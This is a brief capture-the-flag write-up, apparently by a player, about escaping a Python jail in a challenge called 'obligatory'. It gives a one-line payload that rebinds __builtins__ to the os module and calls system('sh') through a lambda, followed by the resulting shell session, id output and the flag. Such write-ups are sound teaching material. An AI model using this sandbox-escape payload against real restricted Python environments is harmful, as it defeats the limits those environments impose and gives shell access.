After 3 days me and my teamm8 finally flagged obligatory...
We started enumerating the functions available and we initially thought to import a module like this or antigravity that do something when imported
but it failed quite quickly...

We understood that lambda would be a way to execute something but we need to reload the builtins or more like to overwrite them with os library
And we finally get the payload...

$ python3 jail.py 
sned cod: (__builtins__:=__import__('os'))and(lambda:system('sh'))()
$ id
uid=1000(sand_xcaper) gid=1000(sand_xcaper) groups=1000(sand_xcaper),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

$ python3 jail.py 
sned cod: (__builtins__:=__import__('os'))and(lambda:system('sh'))()
$ cat flag.txt
actf{c0ulnt_g3t_1t_7o_w0rk_0n_python39_s4dge}
